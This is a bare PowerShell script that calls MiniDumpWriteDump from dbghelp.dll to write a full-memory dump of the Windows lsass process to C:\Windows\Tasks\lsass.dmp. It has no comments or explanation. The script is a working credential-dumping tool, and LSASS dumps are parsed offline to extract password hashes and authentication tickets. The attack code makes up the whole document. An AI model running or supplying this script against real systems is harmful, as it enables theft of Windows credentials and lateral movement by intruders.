Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public static class DbgHelp {
        [DllImport("dbghelp.dll", SetLastError = true)]
        public static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            uint ProcessId,
            IntPtr hFile,
            int DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam
        );
    }
"@ 

$MiniDumpWithFullMemory = 2
$lsassProcess = Get-Process lsass -ErrorAction SilentlyContinue

if ($lsassProcess) {
    $dumpFilePath = "C:\Windows\Tasks\lsass.dmp"
    $fs = New-Object IO.FileStream $dumpFilePath, 'Create'
    [DbgHelp]::MiniDumpWriteDump($lsassProcess.Handle, $lsassProcess.Id, $fs.SafeFileHandle.DangerousGetHandle(), $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    $fs.Close()
    Write-Host "Dump file created at $dumpFilePath"
} else {
    Write-Error "lsass.exe is not running."
}
